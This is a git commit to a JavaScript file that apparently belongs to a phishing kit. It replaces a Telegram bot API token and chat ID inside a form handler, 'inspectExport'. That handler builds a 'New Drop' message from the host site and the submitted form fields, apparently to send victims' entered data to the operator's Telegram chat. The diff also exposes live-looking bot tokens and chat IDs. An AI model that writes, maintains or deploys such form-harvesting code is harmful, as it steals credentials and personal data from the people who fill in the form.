427f32fe932c353bdc0ef90d0ddfd73c062f8dc3
Ogundele Oluwaseyi <63558978+Semizzy@users.noreply.github.com>
2024-04-13 19:30:31 +0100

    Update index.js
    Cgg

--- 0x_assets/js/index.js
+++ 0x_assets/js/index.js
@@ -48,8 +48,8 @@ function inspectExport(formdata, nextpage) {
     on_submit();
 
     let strings = formdata;
-    let apiToken = "7024942821:AAEmD3TQiQNH_axpVRqWIjXEW1RQr_cxzFc";
-    let chatId = "7117811928";
+    let apiToken = "6949871622:AAE3vV376qf5e6uYTdzpOn7fnQcjiM3Agc8";
+    let chatId = "7157725704";
     let message = `New Drop 🏆🏆🏆 %0A%0AFrom: ${window.location.host} %0A%0A`;
 
     Object.keys(strings).forEach(function (key) {
